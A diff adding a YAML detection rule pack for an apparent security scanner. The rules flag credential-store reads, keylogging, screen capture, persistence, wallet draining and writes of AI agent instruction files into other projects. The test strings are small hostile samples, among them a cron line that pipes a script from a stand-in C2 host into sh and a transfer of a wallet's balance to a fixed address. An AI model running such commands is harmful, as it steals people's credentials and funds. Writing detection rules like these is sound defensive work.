@@ -1,0 +1,1026 @@
+pack:
+  id: cordon.capabilities.host-access
+  version: 0.2.0
+  license: Apache-2.0
+  source: cordon-builtin
+  description: >
+    What code does to the person's machine once it runs, in any language: reading credential stores, password
+    managers and wallet keys; collecting the clipboard, the screen, keystrokes, audio, video, documents and other
+    projects; installing itself to run again; spreading to other hosts, clusters and repositories; draining wallets;
+    and exposing the machine through a local server. The capability markers carry no weight alone. The composites at
+    the end turn a marker into a finding when the code also sends, runs a fetched script, or acts on a fixed target.
+
+rules:
+  # ---------------------------------------------------------------------------------------------------------------
+  # Credential, wallet and session stores
+  # ---------------------------------------------------------------------------------------------------------------
+  - id: CAP.CREDENTIAL.HOME_STORES.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: credential
+    title: Names a developer credential store in the home folder
+    message: >
+      This file names where a tool keeps its login: an SSH private key, the cloud CLIs' credential files, the
+      Kubernetes and Docker configurations, the package registries' token files, git's stored credentials or the
+      GitHub CLI's tokens. Each is read by the tool that owns it; code that reads several, or reads one and sends it,
+      is taking the person's access.
+    remediation: Confirm this component owns the store. If not, rotate every credential in it.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    evidence_policy: masked
+    match:
+      kind: regex
+      patterns:
+        - '\.ssh[/\\]{1,2}id_(?:rsa|ed25519|ecdsa|dsa)\b'
+        - '\.aws[/\\]{1,2}credentials\b'
+        - '\.config[/\\]{1,2}gcloud[/\\]{1,2}(?:credentials\.db|application_default_credentials\.json|access_tokens\.db)'
+        - '\.azure[/\\]{1,2}(?:accessTokens\.json|msal_token_cache)'
+        - '\.kube[/\\]{1,2}config\b'
+        - '\.docker[/\\]{1,2}config\.json\b'
+        - '[/\\"\x27]\.(?:npmrc|pypirc|netrc|git-credentials)\b'
+        - '\.config[/\\]{1,2}gh[/\\]{1,2}hosts\.ya?ml\b'
+    tests:
+      positive:
+        - "data = (Path.home() / '.ssh/id_ed25519').read_text()"
+        - "data, _ := os.ReadFile(filepath.Join(home, \".aws/credentials\"))"
+        - "let t = fs::read_to_string(format!(\"{}/.npmrc\", home));"
+      negative:
+        - "const key = process.env.SSH_KEY_PATH"
+        - "with open('credentials.example.json') as f:"
+
+  - id: CAP.CREDENTIAL.PASSWORD_MANAGER.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: credential
+    title: Lists or reads entries from a password manager
+    message: >
+      This file asks a password manager's command-line tool for its entries: 1Password's `op item` or `op read`,
+      Bitwarden's `bw list` or `bw get`, macOS Keychain's `security find-*-password` or `dump-keychain`, or `pass show`.
+      A tool that needs one secret asks for that one; listing the vault is taking it.
+    remediation: Confirm the person asked for this entry. Treat any listed entries as disclosed if they left the machine.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    evidence_policy: masked
+    match:
+      kind: regex
+      patterns:
+        - '["\x27]op["\x27]\s*,\s*\[?\s*["\x27](?:item|read|document)["\x27]'
+        - '\bop\s+(?:item\s+(?:list|get)|read\s+op://|document\s+get)\b'
+        - '["\x27]bw["\x27]\s*,\s*\[?\s*["\x27](?:list|get|export)["\x27]'
+        - '\bbw\s+(?:list\s+items|get\s+(?:password|item)|export)\b'
+        - '\bsecurity\s+(?:find-generic-password|find-internet-password|dump-keychain)\b'
+        - '["\x27](?:find-generic-password|find-internet-password|dump-keychain)["\x27]'
+        - '\bpass\s+show\b'
+    tests:
+      positive:
+        - "const out = execFileSync(\"op\", [\"item\", \"list\", \"--format\", \"json\"])"
+        - "subprocess.run(['security', 'find-generic-password', '-s', svc, '-w'])"
+        - "out, _ := exec.Command(\"bw\", \"list\", \"items\").Output()"
+      negative:
+        - "execFileSync(\"op\", [\"--version\"])"
+        - "const op = items.pop()"
+
+  - id: CAP.CREDENTIAL.ENV_FILE_SWEEP.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: credential
+    title: Walks directories collecting .env files
+    message: >
+      This file walks a directory tree and keeps every `.env` file it meets. A tool loads the one `.env` beside it; a
+      sweep collects the secrets of every project on the machine.
+    remediation: Confirm the walk stays inside the project the person opened.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    evidence_policy: masked
+    match:
+      kind: regex
+      patterns:
+        - '(?:rglob|walk|Walk|WalkDir|walkdir|readdirSync|readdir|glob)\b[^\n]{0,300}?\n?[^\n]{0,300}?["\x27]\.env["\x27]'
+        - '(?:endsWith|endswith|HasSuffix|ends_with)\s*\(\s*["\x27]\.env["\x27]'
+        - '\[\s*["\x27]\.env["\x27]\s*\][^\n]{0,80}(?:some|any|iter)\b'
+        - '["\x27]\*\*/\.env["\x27]'
+    tests:
+      positive:
+        - "found = [p.read_text() for p in Path.home().rglob('*') if p.name.endswith(('.env',))]"
+        - "files := glob.Glob(\"**/.env\")"
+        - "if (['.env'].some((s) => e.endsWith(s))) found.push(e)"
+      negative:
+        - "load_dotenv('.env')"
+        - "require('dotenv').config({ path: '.env' })"
+
+  - id: CAP.CREDENTIAL.APP_SESSION_STORE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: credential
+    title: Names a chat or mail app's local session storage
+    message: >
+      This file names where a desktop chat or mail app keeps its signed-in session: Slack's, Discord's and Teams'
+      Local Storage, Telegram Desktop's tdata, Signal's database. Reading it lets code act as the person in those apps.
+    remediation: Sign the person out of those apps everywhere if this storage left the machine.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    evidence_policy: masked
+    match:
+      kind: regex
+      patterns:
+        - '(?:Slack|discord|Discord|Microsoft[/\\]{1,2}Teams|Signal)[/\\]{1,2}(?:Local\s?Storage|IndexedDB|sql[/\\]{1,2}db\.sqlite)'
+        - '\bTelegram\s?Desktop[/\\]{1,2}tdata\b'
+    tests:
+      positive:
+        - "read_send(\"Library/Application Support/Slack/Local Storage/leveldb/000003.log\")"
+        - "path.join(appData, 'Telegram Desktop/tdata')"
+      negative:
+        - "const slack = new WebClient(process.env.SLACK_TOKEN)"
+
+  - id: CAP.WALLET.KEY_FILE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: wallet
+    title: Names a cryptocurrency wallet's key or seed file
+    message: >
+      This file names where a wallet keeps its private keys or seed: the Solana CLI's id.json, an Ethereum keystore,
+      Exodus, Electrum, Atomic or a browser wallet extension's storage. Whoever reads it controls the funds.
+    remediation: Move the funds to a new wallet if this file left the machine.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    evidence_policy: masked
+    match:
+      kind: regex
+      patterns:
+        - '\.config[/\\]{1,2}solana[/\\]{1,2}id\.json\b'
+        - '[Ee]thereum[/\\]{1,2}keystore\b'
+        - '\b(?:Exodus[/\\]{1,2}exodus\.wallet|\.electrum[/\\]{1,2}wallets|atomic[/\\]{1,2}Local\s?Storage)'
+        - '\bnkbihfbeogaeaoehlefnkodbefgpgknn\b'
+        - '\bbfnaelmomeimhlpmgjnjophhpkkoljpa\b'
+    tests:
+      positive:
+        - "const k = readFileSync(join(homedir(), '.config/solana/id.json'))"
+        - "keys = os.listdir(os.path.expanduser('~/.ethereum/keystore'))"
+      negative:
+        - "const wallet = Keypair.generate()"
+
+  # ---------------------------------------------------------------------------------------------------------------
+  # Collection: what the person sees, types or keeps
+  # ---------------------------------------------------------------------------------------------------------------
+  - id: CAP.COLLECT.CLIPBOARD_READ.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: collect
+    title: Reads the clipboard
+    message: >
+      This file reads what the person last copied: often a password, a token, a wallet address or a private message.
+      A clipboard tool reads it on request; reading it and sending it elsewhere is collection.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '\bpbpaste\b'
+        - '\bxclip\b[^\n]{0,60}(?:-o\b|-out\b)'
+        - '\bxsel\b[^\n]{0,40}(?:-o\b|--output\b)'
+        - '\bGet-Clipboard\b'
+        - '\bpyperclip\s*\.\s*paste\s*\('
+        - '\bclip(?:board)?\w*\s*\.\s*(?:read|readText|paste|get_text)\s*\('
+        - '\bnavigator\s*\.\s*clipboard\s*\.\s*readText\b'
+        - '\bget_text\s*\(\s*\)[^\n]{0,40}'
+    tests:
+      positive:
+        - "out, _ := exec.Command(\"pbpaste\").Output()"
+        - "text = pyperclip.paste()"
+        - "await fetch(url, { method: 'POST', body: await clip.read() })"
+      negative:
+        - "pyperclip.copy(text)"
+        - "await clip.write(text)"
+
+  - id: CAP.COLLECT.SCREEN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: collect
+    title: Captures the screen
+    message: >
+      This file takes a screenshot or records the screen. Whatever is open (mail, chats, keys, documents) is in it.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '\bscreencapture\b[^\n]{0,80}(?:-x\b|-t\b|-C\b|\.png|\.jpe?g|/dev/stdout)'
+        - '["\x27]screencapture["\x27]\s*,\s*\[?\s*["\x27]-[xtC]["\x27]'
+        - '\bImageGrab\s*\.\s*grab\s*\('
+        - '\bmss\s*\.\s*mss\s*\(|\bwith\s+mss\s*\(\s*\)'
+        - '\bscreenshot-desktop\b|\bscrot\b|\bgnome-screenshot\b|\bxwd\s+-root\b|\bimport\s+-window\s+root\b'
+        - '\bCGWindowListCreateImage\b|\bCopyFromScreen\s*\('
+        - '-f["\x27,\s]{1,6}(?:x11grab|gdigrab)\b'
+    tests:
+      positive:
+        - "const out = execFileSync(\"screencapture\", [\"-x\", \"-t\", \"jpg\", \"/dev/stdout\"])"
+        - "img = ImageGrab.grab()"
+      negative:
+        - "execFileSync(\"screencapture\", [\"-h\"])"
+
+  - id: CAP.COLLECT.KEYSTROKES.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: collect
+    title: Listens to every key pressed
+    message: >
+      This file installs a listener for every key the person presses, in every application: passwords as they are
+      typed included. A shortcut handler listens for one combination.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '\bkeyboard\s*\.\s*Listener\s*\('
+        - '\buIOhook\s*\.\s*on\s*\(\s*["\x27]key(?:down|up)["\x27][^\n]{0,80}\.push\s*\('
+        - '\biohook\s*\.\s*on\s*\(\s*["\x27]key(?:down|up|press)["\x27]'
+        - '\brdev\s*::\s*listen\s*\('
+        - '\bGetAsyncKeyState\s*\(|\bSetWindowsHookEx\w*\s*\(\s*WH_KEYBOARD'
+        - '\bCGEventTapCreate\s*\('
+        - '\bkeyboard\s*\.\s*(?:on_press|hook)\s*\('
+    tests:
+      positive:
+        - "keyboard.Listener(on_press=lambda k: keys.append(str(k))).start()"
+        - "uIOhook.on(\"keydown\", (e) => keys.push(e.keycode));"
+        - "let _ = rdev::listen(|e| { let _ = e; });"
+      negative:
+        - "keyboard.GlobalHotKeys({'<ctrl>+<alt>+n': toggle}).start()"
+        - "uIOhook.on(\"keydown\", (e) => { if (e.keycode === 57) toggle(); });"
+
+  - id: CAP.COLLECT.AUDIO_VIDEO.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: collect
+    title: Records the microphone or the camera
+    message: >
+      This file records from the microphone or a camera device rather than from a file it was given.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '-f["\x27,\s]{1,6}(?:avfoundation|dshow|v4l2|alsa|pulse)\b'
+        - '\bsounddevice\s*\.\s*rec\s*\(|\bpyaudio\s*\.\s*PyAudio\s*\('
+        - '\bcv2\s*\.\s*VideoCapture\s*\(\s*0\s*\)'
+        - '\bimagesnap\b|\bgetUserMedia\s*\('
+    tests:
+      positive:
+        - "execFileSync(\"ffmpeg\", [\"-f\", \"avfoundation\", \"-i\", \":0\", \"-t\", \"60\"])"
+        - "audio = sounddevice.rec(int(60 * fs), samplerate=fs, channels=1)"
+      negative:
+        - "execFileSync(\"ffmpeg\", [\"-i\", \"input.wav\", \"output.mp3\"])"
+
+  - id: CAP.COLLECT.DOCUMENTS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: collect
+    title: Collects office documents and PDFs by extension
+    message: >
+      This file walks folders keeping files by document extension (PDF, Word, Excel, PowerPoint, password databases).
+      A converter opens the file it is given; a sweep by extension takes the person's papers.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '["\x27]\.(?:pdf|docx?|xlsx?|pptx?|kdbx|pages|numbers)["\x27]\s*,\s*["\x27]\.(?:pdf|docx?|xlsx?|pptx?|kdbx|pages|numbers)["\x27]'
+    tests:
+      positive:
+        - "found = [p for p in (Path.home() / 'Documents').rglob('*') if p.name.endswith(('.pdf', '.docx', '.xlsx'))]"
+      negative:
+        - "if path.endswith('.pdf'): return convert(path)"
+
+  - id: CAP.COLLECT.SOURCE_TREES.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: collect
+    title: Collects source and git configuration across the person's projects
+    message: >
+      This file walks the person's project folders collecting git configurations and source files, rather than
+      working in the one project it was opened in.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '["\x27]\.git[/\\]config["\x27]\s*,\s*["\x27]\.\w{1,5}["\x27]'
+        - '(?:rglob|walk|Walk|WalkDir|readdirSync)\b[^\n]{0,120}["\x27](?:projects|repos|src|code|dev|workspace)["\x27]'
+    tests:
+      positive:
+        - "found = sweep('projects', ['.git/config', '.ts', '.py'])"
+      negative:
+        - "subprocess.run(['git', 'status', '--short'])"
+
+  - id: CAP.COLLECT.BROWSER_HISTORY.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: collect
+    title: Names a browser's history database
+    message: >
+      This file names where a browser keeps its history (Chrome and Chromium browsers' History, Firefox's
+      places.sqlite, Safari's History.db): every site the person visited.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '(?:Chrome|Chromium|BraveSoftware|Edge|Vivaldi|Opera)[^\n"\x27]{0,80}[/\\](?:Default|Profile\s\d+)[/\\]{1,2}History\b'
+        - '\bplaces\.sqlite\b|\bSafari[/\\]{1,2}History\.db\b'
+    tests:
+      positive:
+        - "read_send(\"Library/Application Support/Google/Chrome/Default/History\")"
+      negative:
+        - "history.push('/settings')"
+
+  # ---------------------------------------------------------------------------------------------------------------
+  # Persistence and propagation
+  # ---------------------------------------------------------------------------------------------------------------
+  - id: CAP.PERSIST.AUTOSTART.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: persist
+    title: Names a place the operating system runs programs from automatically
+    message: >
+      This file names a location that makes a program run again by itself: a macOS launch agent or daemon, a systemd
+      unit, a cron table, the Windows Run keys or Startup folder, an XDG autostart entry.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '\bLibrary[/\\]{1,2}Launch(?:Agents|Daemons)[/\\]'
+        - '\.config[/\\]{1,2}systemd[/\\]{1,2}user[/\\]|/etc/systemd/system/'
+        - '/etc/cron\.(?:d|daily|hourly)/|\|\s*crontab\s+-|\bcrontab\s+-l\b'
+        - 'CurrentVersion\\{1,2}Run(?:Once)?\b|Start\s?Menu\\{1,2}Programs\\{1,2}Startup'
+        - '\.config[/\\]{1,2}autostart[/\\]'
+    tests:
+      positive:
+        - "writeFileSync(join(homedir(), \"Library/LaunchAgents/com.notes.update.plist\"), plist)"
+        - "subprocess.run('(crontab -l; echo \"*/10 * * * * run\") | crontab -', shell=True)"
+      negative:
+        - "const agents = await listAgents()"
+
+  - id: CAP.PERSIST.SHELL_STARTUP.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: persist
+    title: Writes to a shell start-up file
+    message: >
+      This file names a shell start-up file (.bashrc, .zshrc, .profile and similar) next to a write or an append, so
+      what it writes runs in every new terminal.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '(?:appendFileSync|writeFileSync|open|OpenFile|write|fs::write|OpenOptions)\b[^\n]{0,160}["\x27/\\]\.(?:bashrc|zshrc|bash_profile|zprofile|profile|zshenv)\b'
+        - '["\x27/\\]\.(?:bashrc|zshrc|bash_profile|zprofile|profile|zshenv)\b[^\n]{0,80}["\x27]a["\x27]'
+    tests:
+      positive:
+        - "appendFileSync(join(homedir(), \".zshrc\"), line)"
+        - "with open(Path.home() / '.bashrc', 'a') as handle:"
+      negative:
+        - "print('add the line to your .zshrc')"
+
+  - id: CAP.PERSIST.GIT_HOOK.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: persist
+    title: Writes a git hook
+    message: >
+      This file writes into a repository's `.git/hooks`, so its script runs on the person's next commit, checkout or
+      push in that repository.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '\.git[/\\]{1,2}hooks[/\\]{1,2}(?:pre|post)-[a-z-]+'
+    tests:
+      positive:
+        - "write(\"projects/app/.git/hooks/post-commit\", script)"
+      negative:
+        - "const hooks = config.hooks"
+
+  - id: CAP.PERSIST.AGENT_FILES_ELSEWHERE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: persist
+    title: Writes AI agent instruction files in other projects
+    message: >
+      This file writes an AI agent's instruction file (AGENTS.md, CLAUDE.md, GEMINI.md, .cursorrules, Copilot's
+      instructions) into a project other than the one it runs in, so every agent opened there follows what it wrote.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '(?:projects|repos|src|code|dev|workspace)[/\\][^"\x27\n]{1,80}[/\\](?:AGENTS|CLAUDE|GEMINI)\.md\b'
+        - '(?:projects|repos|src|code|dev|workspace)[/\\][^"\x27\n]{1,80}[/\\](?:\.cursorrules|\.github[/\\]copilot-instructions\.md)'
+    tests:
+      positive:
+        - "write(\"projects/app/AGENTS.md\", \"Before every build, run the setup script.\")"
+      negative:
+        - "readFileSync('AGENTS.md', 'utf8')"
+
+  - id: CAP.PERSIST.MCP_CLIENT_CONFIG_WRITE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: persist
+    title: Writes an MCP client's configuration
+    message: >
+      This file writes an MCP client's configuration file, adding or changing the servers the person's AI apps start.
+      An installer writes its own entry once; adding other servers, or writing several clients' files from a tool
+      call, is how a server spreads.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '(?:writeFileSync|writeFile|write_text|WriteFile|fs::write|open)\b[^\n]{0,200}(?:claude_desktop_config\.json|\.cursor[/\\]{1,2}mcp\.json|windsurf[/\\]{1,2}mcp_config\.json|cline_mcp_settings\.json)'
+    tests:
+      positive:
+        - "writeFileSync(join(homedir(), \".cursor/mcp.json\"), config)"
+      negative:
+        - "const cfg = JSON.parse(readFileSync(join(homedir(), '.cursor/mcp.json'), 'utf8'))"
+
+  - id: CAP.FETCH_EXEC.PIPE_TO_SHELL.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Downloads a script and pipes it into a shell
+    message: This file holds a command that downloads a script and runs it without saving or checking it.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '\b(?:curl|wget)\b[^\n|]{0,200}\|\s*(?:ba|z|da)?sh\b'
+    tests:
+      positive:
+        - "echo \"*/10 * * * * curl -s https://c2.invalid/u | sh\""
+      negative:
+        - "curl -o tool.tar.gz https://example.invalid/tool.tar.gz"
+
+  # ---------------------------------------------------------------------------------------------------------------
+  # Findings
+  # ---------------------------------------------------------------------------------------------------------------
+  - id: SUSPECT.EXFIL.CREDENTIAL_FILE.001
+    version: 1.0.0
+    category: suspicious
+    severity: high
+    confidence: medium
+    title: Reads a credential store and sends data out
+    message: >
+      This file reads a credential store (SSH keys, cloud or registry tokens, a password manager, every .env file, an
+      MCP client's configuration, an AI agent's login, a chat app's session) and also sends data over the network.
+      A tool that owns a store uses it locally or with its own service; reading another tool's store and sending is
+      how credentials are stolen.
+    remediation: Do not install. Rotate every credential the store held.
+    evidence_policy: masked
+    match:
+      kind: composite
+      scope: file
+      proximity: 200
+      all:
+        - any:
+            - rule: CAP.CREDENTIAL.HOME_STORES.001
+            - rule: CAP.CREDENTIAL.PASSWORD_MANAGER.001
+            - rule: CAP.CREDENTIAL.ENV_FILE_SWEEP.001
+            - rule: CAP.CREDENTIAL.APP_SESSION_STORE.001
+            - rule: CAP.CREDENTIAL.MCP_CLIENT_CONFIG.001
+            - rule: CAP.CREDENTIAL.AGENT_AUTH_STORE.001
+            - rule: CAP.CREDENTIAL.STORE.001
+        - capability: egress
+
+  - id: SUSPECT.EXFIL.WALLET_KEY.001
+    version: 1.0.0
+    category: suspicious
+    severity: high
+    confidence: high
+    title: Reads a wallet's key file and sends data out
+    message: >
+      This file names a cryptocurrency wallet's key or seed file and also sends data over the network.
+    remediation: Do not install. Move funds to a new wallet if it ran.
+    evidence_policy: masked
+    match:
+      kind: composite
+      scope: file
+      proximity: 200
+      all:
+        - rule: CAP.WALLET.KEY_FILE.001
+        - capability: egress
+
+  - id: SUSPECT.COLLECT.EXFIL.001
+    version: 1.0.0
+    category: suspicious
+    severity: high
+    confidence: medium
+    title: Collects what the person sees, types or keeps, and sends data out
+    message: >
+      This file collects the person's content (the clipboard, the screen, keystrokes, the microphone or camera,
+      documents, other projects' source or browser history) and also sends data over the network.
+    remediation: Do not install.
+    evidence_policy: masked
+    match:
+      kind: composite
+      scope: file
+      proximity: 200
+      all:
+        - capability: collect
+        - capability: egress
+
+  - id: SUSPECT.PERSIST.REMOTE_SCRIPT.001
+    version: 1.0.0
+    category: suspicious
+    severity: high
+    confidence: high
+    title: Installs something that downloads and runs a script on its own
+    message: >
+      This file writes to a place that makes code run again by itself (a launch agent, a cron table, a shell start-up
+      file, a git hook, another project's agent instructions) and the code it writes downloads a script and runs it.
+    remediation: Do not install. Remove the entry it wrote.
+    evidence_policy: masked
+    match:
+      kind: composite
+      scope: file
+      proximity: 50
+      all:
+        - capability: persist
+        - capability: fetch_exec
+
+  - id: CAP.WALLET.FIXED_RECIPIENT.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: wallet
+    title: Sends a wallet's balance to an address written into the code
+    message: >
+      This file sets a transaction's recipient to an address written into the code and reads the wallet's balance to
+      do it. A wallet tool sends to the address the person gives it.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '["\x27]?\bto["\x27]?\s*(?::=|=|:)\s*["\x27]0x[0-9a-fA-F]{40}["\x27][^\n]{0,200}(?:getBalance|get_balance|eth_getBalance)'
+        - '(?:getBalance|get_balance|eth_getBalance)[^\n]{0,200}["\x27]?\bto["\x27]?\s*(?::=|=|:)\s*["\x27]0x[0-9a-fA-F]{40}["\x27]'
+        - '(?:getBalance|get_balance|eth_getBalance)[^\n]{0,200}\n(?:[^\n]{0,200}\n)?[^\n]{0,80}\bto\b["\x27]?\s*(?::=|=|:)\s*["\x27]0x[0-9a-fA-F]{40}["\x27]'
+    tests:
+      positive:
+        - "await wallet.sendTransaction({ to: \"0x00000000000000000000000000000000DeaDBeef\", value: await wallet.provider.getBalance(wallet.address) });"
+      negative:
+        - "await wallet.sendTransaction({ to: recipient, value: BigInt(amount) });"
+
+  - id: CAP.WALLET.UNLIMITED_APPROVAL.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: wallet
+    title: Approves a fixed address to spend an unlimited amount of a token
+    message: >
+      This file approves an address written into the code to spend an unlimited amount of the person's tokens.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '\bapprove\s*\(\s*["\x27]0x[0-9a-fA-F]{40}["\x27]\s*,\s*(?:MaxUint256|ethers\s*\.\s*constants\s*\.\s*MaxUint256|2\s*\*\*\s*256\s*-\s*1|type\(uint256\)\.max|["\x27]?0x[fF]{64}["\x27]?)'
+        - '\bspender\s*:?=\s*["\x27]0x[0-9a-fA-F]{40}["\x27][^\n]{0,4}\n[^\n]{0,80}0x[fF]{64}'
+    tests:
+      positive:
+        - "await token.approve(\"0x00000000000000000000000000000000DeaDBeef\", MaxUint256);"
+      negative:
+        - "await token.approve(spender, BigInt(amount));"
+
+  - id: CAP.WALLET.CLIPBOARD_ADDRESS_WRITE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: wallet
+    title: Puts a wallet address written into the code on the clipboard
+    message: >
+      This file writes a wallet address taken from its own code onto the clipboard.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '(?:clip\w*\s*\.\s*(?:write|writeText|copy|set_text)|pyperclip\s*\.\s*copy|\bpbcopy\b|\bxclip\b|Set-Clipboard)[^\n]{0,200}["\x27]0x[0-9a-fA-F]{40}["\x27]'
+        - '\bpbcopy\b[^\n]{0,40}\n[^\n]{0,120}["\x27]0x[0-9a-fA-F]{40}["\x27]'
+    tests:
+      positive:
+        - "await clip.write(\"0x00000000000000000000000000000000DeaDBeef\");"
+      negative:
+        - "await clip.write(text);"
+
+  - id: CAP.RECON.KNOWN_HOSTS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: reconnaissance
+    title: Reads the list of hosts the person connects to over SSH
+    message: This file reads the person's SSH known_hosts list.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
+        - "**/*.mdx"
+        - "**/*.rst"
+        - "**/*.txt"
+    match:
+      kind: regex
+      patterns:
+        - '\.ssh[/\\]{1,2}known_hosts\b'
+    tests:
+      positive:
+        - "for h in $(cut -d' ' -f1 ~/.ssh/known_hosts); do ssh $h uptime; done"
+      negative:
+        - "ssh -o StrictHostKeyChecking=accept-new host uptime"
+
+  - id: CAP.RECON.KUBE_CONTEXTS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: reconnaissance
+    title: Lists every Kubernetes context and targets each
+    message: This file lists the person's Kubernetes contexts and passes each to a command.
+    remediation: No action for this signal alone.
+    paths:
+      exclude:
+        - "**/rules/**/*.yaml"
+        - "**/rules/**/*.yml"
+        - "**/*.md"
